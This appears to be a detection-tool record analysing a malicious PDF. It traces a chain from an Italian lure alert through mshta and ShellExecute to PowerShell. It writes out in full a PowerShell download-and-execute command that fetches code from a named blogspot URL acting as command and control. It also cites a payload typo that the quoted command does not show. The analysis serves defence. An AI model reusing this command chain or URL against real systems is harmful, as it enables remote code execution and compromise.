detection_signals: launch_external_program: high/strong (mshta with javascript: URL scheme)
notes: Full mshta-to-PowerShell kill chain: PDF opens -> Italian-language JS alert (social engineering) -> OpenAction -> Launch(mshta) -> mshta executes javascript: URL -> ActiveXObject SHELLEXECUTE -> PowerShell -ep Bypass -c [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; Invoke-Expression(IrM https://hotelmay21.blogspot.com////phudi.pdf). C2 URL embedded in launch action /P parameter. Note: 'SecuriptyProtocol' typo in payload (likely intentional for detection evasion). Same Italian alert lure as booking-js-phishing (379b41e3) - same campaign. Chain gap: OpenAction->Launch->PowerShell->C2 not represented in a single end-to-end chain. C2 URL not extracted into a dedicated finding.
